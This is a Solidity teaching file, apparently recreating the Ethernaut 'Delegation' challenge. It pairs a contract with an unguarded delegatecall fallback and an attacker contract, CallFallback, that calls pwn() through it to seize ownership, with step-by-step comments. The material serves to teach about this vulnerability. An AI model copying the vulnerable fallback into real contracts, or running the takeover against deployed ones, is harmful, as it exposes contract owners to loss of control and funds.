// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
  First, deploy Delegate.sol, passing in user address
  Then, deploy Delegation.sol, passing in the address of the Delegate contract
  Then, deploy CallFallback.sol
  Then, call CallFallback.toCallFallback() passing in the address of Delegation contract
  Finally, call Delegation.owner() to see the effect of the delegatecall.
  The owner of the Delegation contract will be changed to the address of the caller of CallFallback.toCallFallback(),
  because when delegatecall is used, the called contract’s function is executed in the context of the calling contract. This means that the called contract’s function can modify the state of the calling contract.
 */

contract Delegate {

  address public owner;

  event MsgDelegate (
    address owner
  );

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
    emit MsgDelegate(owner);
  }
}

contract Delegation {

  address public owner;
  Delegate delegateInst;
  event Msg01 (
    address delegate,
    address owner
  );
  event Msg02 (
    bool result,
    address delegate
  );

  constructor(address _delegateAddress)  {
    // instantiating a contract that is already there
    delegateInst = Delegate(_delegateAddress);
    owner = msg.sender;
    address delegateAddr = address(delegateInst);
    emit Msg01(delegateAddr, owner);
  }

  fallback() external {
    (bool result,) = address(delegateInst).delegatecall(msg.data);
    emit Msg02(result, address(delegateInst));
  }
}

contract CallFallback {
    function toCallFallback(address _addr) public returns (bool) {
        (bool sent,) = _addr.call(abi.encodeWithSignature("pwn()"));
        return sent;
    }
}